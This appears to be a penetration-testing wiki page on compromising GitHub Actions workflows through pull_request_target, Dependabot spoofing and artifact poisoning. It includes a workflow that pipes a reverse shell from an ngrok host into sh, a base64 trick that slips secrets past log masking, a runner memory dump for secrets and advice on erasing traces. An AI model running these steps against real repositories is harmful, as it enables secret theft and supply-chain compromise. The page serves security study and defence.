{{#include ../../../banners/hacktricks-training.md}}

## Tools

The following tools are useful to find Github Action workflows and even find vulnerable ones:

- [https://github.com/zizmorcore/zizmor](https://github.com/zizmorcore/zizmor) - Check also its checklist in [https://docs.zizmor.sh/audits](https://docs.zizmor.sh/audits)

## Basic Information

In this page you will find:

- A **summary of all the impacts** of an attacker managing to access a Github Action
- Different ways to **get access to an action**:
  - Having **permissions** to create the action
  - Abusing **pull request** related triggers
  - Abusing **other external access** techniques
  - **Pivoting** from an already compromised repo
- Finally, a section about **post-exploitation techniques to abuse an action from inside** (cause the mentioned impacts)

## Impacts Summary

For an introduction about [**Github Actions check the basic information**](../basic-github-information.md#github-actions).

If you can **execute arbitrary code in GitHub Actions** within a **repository**, you may be able to:

- **Steal secrets** mounted to the pipeline and **abuse the pipeline's privileges** to gain unauthorized access to external platforms, such as AWS and GCP.
- **Compromise deployments** and other **artifacts**.
  - If the pipeline deploys or stores assets, you could alter the final product, enabling a supply chain attack.
- **Execute code in custom workers** to abuse computing power and pivot to other systems.
- **Overwrite repository code**, depending on the permissions associated with the `GITHUB_TOKEN`.

## GITHUB_TOKEN

This "**secret**" (coming from `${{ secrets.GITHUB_TOKEN }}` and `${{ github.token }}`) is given when the admin enables this option:

<figure><img src="../../../images/image (86).png" alt=""><figcaption></figcaption></figure>

This token is the same one a **Github Application will use**, so it can access the same endpoints: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

> [!WARNING]
> Github should release a [**flow**](https://github.com/github/roadmap/issues/74) that **allows cross-repository** access within GitHub, so a repo can access other internal repos using the `GITHUB_TOKEN`.

You can see the possible **permissions** of this token in: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token)

Note that the token **expires after the job has completed**.\
These tokens looks like this: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

Some interesting things you can do with this token:

{{#tabs }}
{{#tab name="Merge PR" }}

```bash
# Merge PR
curl -X PUT \
    https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
    -H "Accept: application/vnd.github.v3+json" \
    --header "authorization: Bearer $GITHUB_TOKEN" \
    --header "content-type: application/json" \
    -d "{\"commit_title\":\"commit_title\"}"
```

{{#endtab }}
{{#tab name="Approve PR" }}

```bash
# Approve a PR
curl -X POST \
    https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
    -H "Accept: application/vnd.github.v3+json" \
    --header "authorization: Bearer $GITHUB_TOKEN" \
    --header 'content-type: application/json' \
    -d '{"event":"APPROVE"}'
```

{{#endtab }}
{{#tab name="Create PR" }}

```bash
# Create a PR
curl -X POST \
  -H "Accept: application/vnd.github.v3+json" \
  --header "authorization: Bearer $GITHUB_TOKEN" \
    --header 'content-type: application/json' \
  https://api.github.com/repos/<org_name>/<repo_name>/pulls \
  -d '{"head":"<branch_name>","base":"master", "title":"title"}'
```

{{#endtab }}
{{#endtabs }}

> [!CAUTION]
> Note that in several occasions you will be able to find **github user tokens inside Github Actions envs or in the secrets**. These tokens may give you more privileges over the repository and organization.

## Allowed Execution

> [!NOTE]
> This would be the easiest way to compromise Github actions, as this case suppose that you have access to **create a new repo in the organization**, or have **write privileges over a repository**.
>
> If you are in this scenario you can just check the [Post Exploitation techniques](#post-exploitation-techniques-from-inside-an-action).

### Execution from Repo Creation

In case members of an organization can **create new repos** and you can execute github actions, you can **create a new repo and steal the secrets set at organization level**.

### Execution from a New Branch

If you can **create a new branch in a repository that already contains a Github Action** configured, you can **modify** it, **upload** the content, and then **execute that action from the new branch**. This way you can **exfiltrate repository and organization level secrets** (but you need to know how they are called).

You can make the modified action executable **manually,** when a **PR is created** or when **some code is pushed** (depending on how noisy you want to be):

```yaml
on:
  workflow_dispatch: # Launch manually
  pull_request: #Run it when a PR is created to a branch
    branches:
      - master
  push: # Run it when a push is made to a branch
    branches:
      - current_branch_name
# Use '**' instead of a branh name to trigger the action in all the cranches
```

---

## Forked Execution

> [!NOTE]
> There are different triggers that could allow an attacker to **execute a Github Action of another repository**. If those triggerable actions are poorly configured, an attacker could be able to compromise them.

### `pull_request`

The workflow trigger **`pull_request`** will execute the workflow every time a pull request is received with some exceptions: by default if it's the **first time** you are **collaborating**, some **maintainer** will need to **approve** the **run** of the workflow:

<figure><img src="../../../images/image (184).png" alt=""><figcaption></figcaption></figure>

> [!NOTE]
> As the **default limitation** is for **first-time** contributors, you could contribute **fixing a valid bug/typo** and then send **other PRs to abuse your new `pull_request` privileges**.
>
> **I tested this and it doesn't work**: ~~Another option would be to create an account with the name of someone that contributed to the project and deleted his account.~~

Moreover, by default **prevents write permissions** and **secrets access** to the target repository as mentioned in the [**docs**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories):

> With the exception of `GITHUB_TOKEN`, **secrets are not passed to the runner** when a workflow is triggered from a **forked** repository. The **`GITHUB_TOKEN` has read-only permissions** in pull requests **from forked repositories**.

An attacker could modify the definition of the Github Action in order to execute arbitrary things and append arbitrary actions. However, he won't be able to steal secrets or overwrite the repo because of the mentioned limitations.

> [!CAUTION]
> **Yes, if the attacker change in the PR the github action that will be triggered, his Github Action will be the one used and not the one from the origin repo!**

As the attacker also controls the code being executed, even if there aren't secrets or write permissions on the `GITHUB_TOKEN` an attacker could for example **upload malicious artifacts**.

### **`pull_request_target`**

The workflow trigger **`pull_request_target`** have **write permission** to the target repository and **access to secrets** (and doesn't ask for permission).

Note that the workflow trigger **`pull_request_target`** **runs in the base context** and not in the one given by the PR (to **not execute untrusted code**). For more info about `pull_request_target` [**check the docs**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull_request_target).\
Moreover, for more info about this specific dangerous use check this [**github blog post**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/).

It might look like because the **executed workflow** is the one defined in the **base** and **not in the PR** it's **secure** to use **`pull_request_target`**, but there are a **few cases were it isn't**.

An this one will have **access to secrets**.

### `workflow_run`

The [**workflow_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow_run) trigger allows to run a workflow from a different one when it's `completed`, `requested` or `in_progress`.

In this example, a workflow is configured to run after the separate "Run Tests" workflow completes:

```yaml
on:
  workflow_run:
    workflows: [Run Tests]
    types:
      - completed
```

Moreover, according to the docs: The workflow started by the `workflow_run` event is able to **access secrets and write tokens, even if the previous workflow was not**.

This kind of workflow could be attacked if it's **depending** on a **workflow** that can be **triggered** by an external user via **`pull_request`** or **`pull_request_target`**. A couple of vulnerable examples can be [**found this blog**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability)**.** The first one consist on the **`workflow_run`** triggered workflow downloading out the attackers code: `${{ github.event.pull_request.head.sha }}`\
The second one consist on **passing** an **artifact** from the **untrusted** code to the **`workflow_run`** workflow and using the content of this artifact in a way that makes it **vulnerable to RCE**.

### `workflow_call`

TODO

TODO: Check if when executed from a pull_request the used/downloaded code if the one from the origin or from the forked PR

## Abusing Forked Execution

We have mentioned all the ways an external attacker could manage to make a github workflow to execute, now let's take a look about how this executions, if bad configured, could be abused:

### Untrusted checkout execution

In the case of **`pull_request`,** the workflow is going to be executed in the **context of the PR** (so it'll execute the **malicious PRs code**), but someone needs to **authorize it first** and it will run with some [limitations](#pull_request).

In case of a workflow using **`pull_request_target` or `workflow_run`** that depends on a workflow that can be triggered from **`pull_request_target` or `pull_request`** the code from the original repo will be executed, so the **attacker cannot control the executed code**.

> [!CAUTION]
> However, if the **action** has an **explicit PR checkou**t that will **get the code from the PR** (and not from base), it will use the attackers controlled code. For example (check line 12 where the PR code is downloaded):

<pre class="language-yaml"><code class="lang-yaml"># INSECURE. Provided as an example only.
on:
  pull_request_target

jobs:
  build:
    name: Build and test
    runs-on: ubuntu-latest
    steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
    - uses: actions/setup-node@v1
    - run: |
        npm install
        npm build

    - uses: completely/fakeaction@v2
      with:
        arg1: ${{ secrets.supersecret }}

    - uses: fakerepo/comment-on-pr@v1
      with:
        message: |
          Thank you!
</code></pre>

The potentially **untrusted code is being run during `npm install` or `npm build`** as the build scripts and referenced **packages are controlled by the author of the PR**.

> [!WARNING]
> A github dork to search for vulnerable actions is: `event.pull_request pull_request_target extension:yml` however, there are different ways to configure the jobs to be executed securely even if the action is configured insecurely (like using conditionals about who is the actor generating the PR).

### Context Script Injections <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

Note that there are certain [**github contexts**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context) whose values are **controlled** by the **user** creating the PR. If the github action is using that **data to execute anything**, it could lead to **arbitrary code execution:**

{{#ref}}
gh-actions-context-script-injections.md
{{#endref}}

### **GITHUB_ENV Script Injection** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

From the docs: You can make an **environment variable available to any subsequent steps** in a workflow job by defining or updating the environment variable and writing this to the **`GITHUB_ENV`** environment file.

If an attacker could **inject any value** inside this **env** variable, he could inject env variables that could execute code in following steps such as **LD_PRELOAD** or **NODE_OPTIONS**.

For example ([**this**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) and [**this**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)), imagine a workflow that is trusting an uploaded artifact to store its content inside **`GITHUB_ENV`** env variable. An attacker could upload something like this to compromise it:

<figure><img src="../../../images/image (261).png" alt=""><figcaption></figcaption></figure>

### Dependabot and other trusted bots

As indicated in [**this blog post**](https://boostsecurity.io/blog/weaponizing-dependabot-pwn-request-at-its-finest), several organizations have a Github Action that merges any PRR from `dependabot[bot]` like in:

```yaml
on: pull_request_target
jobs:
  auto-merge:
    runs-on: ubuntu-latest
    if: ${ { github.actor == 'dependabot[bot]' }}
    steps:
      - run: gh pr merge $ -d -m
```

Which is a problem because the `github.actor` field contains the user who caused the latest event that triggered the workflow. And There are several ways to make the `dependabot[bot]` user to modify a PR. For example:

- Fork the victim repository
- Add the malicious payload to your copy
- Enable Dependabot on your fork adding an outdated dependency. Dependabot will create a branch fixing the dependency with malicious code.
- Open a Pull Request to the victim repository from that branch (the PR will be created by the user so nothing will happen yet)
- Then, attacker goes back to the initial PR Dependabot opened in his fork and runs `@dependabot recreate`
- Then, Dependabot perform some actions in that branch, that modified the PR over the victim repo, which makes `dependabot[bot]` the actor of the latest event that triggered the workflow (and therefore, the workflow runs).

Moving on, what if instead of merging the Github Action would have a command injection like in:

```yaml
on: pull_request_target
jobs:
   just-printing-stuff:
    runs-on: ubuntu-latest
    if: ${ { github.actor == 'dependabot[bot]' }}
    steps:
      - run: echo ${ { github.event.pull_request.head.ref }}
```

Well, the original blogpost proposes two options to abuse this behavior being the second one:

- Fork the victim repository and enable Dependabot with some outdated dependency.
- Create a new branch with the malicious shell injeciton code.
- Change the default branch of the repo to that one
- Create a PR from this branch to the victim repository.
- Run `@dependabot merge` in the PR Dependabot opened in his fork.
- Dependabot will merge his changes in the default branch of your forked repository, updating the PR in the victim repository making now the `dependabot[bot]` the actor of the latest event that triggered the workflow and using a malicious branch name.

### Vulnerable Third Party Github Actions

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

As mentioned in [**this blog post**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks), this Github Action allows to access artifacts from different workflows and even repositories.

The thing problem is that if the **`path`** parameter isn't set, the artifact is extracted in the current directory and it can override files that could be later used or even executed in the workflow. Therefore, if the Artifact is vulnerable, an attacker could abuse this to compromise other workflows trusting the Artifact.

Example of vulnerable workflow:

```yaml
on:
  workflow_run:
    workflows: ["some workflow"]
    types:
      - completed

jobs:
  success:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - name: download artifact
        uses: dawidd6/action-download-artifact
        with:
          workflow: ${{ github.event.workflow_run.workflow_id }}
          name: artifact
      - run: python ./script.py
        with:
          name: artifact
          path: ./script.py
```

This could be attacked with this workflow:

```yaml
name: "some workflow"
on: pull_request

jobs:
    upload:
        runs-on: ubuntu-latest
        steps:
            - run: echo "print('exploited')" > ./script.py
            - uses actions/upload-artifact@v2
              with:
                name: artifact
                path: ./script.py
```

## Other External Access

### Deleted Namespace Repo Hijacking

If an account changes it's name another user could register an account with that name after some time. If a repository had **less than 100 stars previously to the change of nam**e, Github will allow the new register user with the same name to create a **repository with the same name** as the one deleted.

> [!CAUTION]
> So if an action is using a repo from a non-existent account, it's still possible that an attacker could create that account and compromise the action.

If other repositories where using **dependencies from this user repos**, an attacker will be able to hijack them Here you have a more complete explanation: [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

---

## Repo Pivoting

> [!NOTE]
> In this section we will talk about techniques that would allow to **pivot from one repo to another** supposing we have some kind of access on the first one (check the previous section).

### Cache Poisoning

A cache is maintained between **wokflow runs in the same branch**. Which means that if an attacker **compromise** a **package** that is then stored in the cache and **downloaded** and executed by a **more privileged** workflow he will be able to **compromise** also that workflow.

{{#ref}}
gh-actions-cache-poisoning.md
{{#endref}}

### Artifact Poisoning

Workflows could use **artifacts from other workflows and even repos**, if an attacker manages to **compromise** the Github Action that **uploads an artifact** that is later used by another workflow he could **compromise the other workflows**:

{{#ref}}
gh-actions-artifact-poisoning.md

## Post Exploitation from an Action

### Github Action Policies Bypass

As commented in [**this blog post**](https://blog.yossarian.net/2025/06/11/github-actions-policies-dumb-bypass), even if a repository or organization has a policy restricting the use of certain actions, an attacker could just download (`git clone`) and action inside the workflow and then reference it as a local action. As the policies doesn't affect local paths, **the action will be executed without any restriction.**

Example:

```yaml
on: [push, pull_request]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: |
          mkdir -p ./tmp
          git clone https://github.com/actions/checkout.git ./tmp/checkout

      - uses: ./tmp/checkout
        with:
          repository: woodruffw/gha-hazmat
          path: gha-hazmat

      - run: ls && pwd

      - run: ls tmp/checkout
```

### Accessing secrets <a href="#accessing-secrets" id="accessing-secrets"></a>

If you are injecting content into a script it's interesting to know how you can access secrets:

- If the secret or token is set to an **environment variable**, it can be directly accessed through the environment using **`printenv`**.

<details>

<summary>List secrets in Github Action output</summary>

```yaml
name: list_env
on:
  workflow_dispatch: # Launch manually
  pull_request: #Run it when a PR is created to a branch
    branches:
      - '**'
  push: # Run it when a push is made to a branch
    branches:
      - '**'
jobs:
  List_env:
    runs-on: ubuntu-latest
    steps:
      - name: List Env
        # Need to base64 encode or github will change the secret value for "***"
        run: sh -c 'env | grep "secret_" | base64 -w0'
        env:
          secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}

                    secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```

</details>

<details>

<summary>Get reverse shell with secrets</summary>

```yaml
name: revshell
on:
  workflow_dispatch: # Launch manually
  pull_request: #Run it when a PR is created to a branch
    branches:
      - "**"
  push: # Run it when a push is made to a branch
    branches:
      - "**"
jobs:
  create_pull_request:
    runs-on: ubuntu-latest
    steps:
      - name: Get Rev Shell
        run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
        env:
          secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
          secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```

</details>

- If the secret is used **directly in an expression**, the generated shell script is stored **on-disk** and is accessible.
  - ```bash
    cat /home/runner/work/_temp/*
    ```
- For a JavaScript actions the secrets and sent through environment variables
  - ```bash
    ps axe | grep node
    ```
- For a **custom action**, the risk can vary depending on how a program is using the secret it obtained from the **argument**:

  ```yaml
  uses: fakeaction/publish@v3
  with:
    key: ${{ secrets.PUBLISH_KEY }}
  ```

### Abusing Self-hosted runners

The way to find which **Github Actions are being executed in non-github infrastructure** is to search for **`runs-on: self-hosted`** in the Github Action configuration yaml.

**Self-hosted** runners might have access to **extra sensitive information**, to other **network systems** (vulnerable endpoints in the network? metadata service?) or, even if it's isolated and destroyed, **more than one action might be run at the same time** and the malicious one could **steal the secrets** of the other one.

In self-hosted runners it's also possible to obtain the **secrets from the \_Runner.Listener**\_\*\* process\*\* which will contain all the secrets of the workflows at any step by dumping its memory:

```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```

Check [**this post for more information**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/).

### Github Docker Images Registry

It's possible to make Github actions that will **build and store a Docker image inside Github**.\
An example can be find in the following expandable:

<details>

<summary>Github Action Build & Push Docker Image</summary>

```yaml
[...]

- name: Set up Docker Buildx
  uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
  uses: docker/login-action@v1
  with:
    registry: ghcr.io
    username: ${{ github.repository_owner }}
    password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
  run: |
    sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
  uses: docker/build-push-action@v2
    with:
      context: .
      push: true
      tags: |
        ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
        ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```

</details>

As you could see in the previous code, the Github registry is hosted in **`ghcr.io`**.

A user with read permissions over the repo will then be able to download the Docker Image using a personal access token:

```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```

Then, the user could search for **leaked secrets in the Docker image layers:**

### Sensitive info in Github Actions logs

Even if **Github** try to **detect secret values** in the actions logs and **avoid showing** them, **other sensitive data** that could have been generated in the execution of the action won't be hidden. For example a JWT signed with a secret value won't be hidden unless it's [specifically configured](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret).

## Covering your Tracks

(Technique from [**here**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)) First of all, any PR raised is clearly visible to the public in Github and to the target GitHub account. In GitHub by default, we **can’t delete a PR of the internet**, but there is a twist. For Github accounts that are **suspended** by Github, all of their **PRs are automatically deleted** and removed from the internet. So in order to hide your activity you need to either get your **GitHub account suspended or get your account flagged**. This would **hide all your activities** on GitHub from the internet (basically remove all your exploit PR)

An organization in GitHub is very proactive in reporting accounts to GitHub. All you need to do is share “some stuff” in Issue and they will make sure your account is suspended in 12 hours :p and there you have, made your exploit invisible on github.

> [!WARNING]
> The only way for an organization to figure out they have been targeted is to check GitHub logs from SIEM since from GitHub UI the PR would be removed.
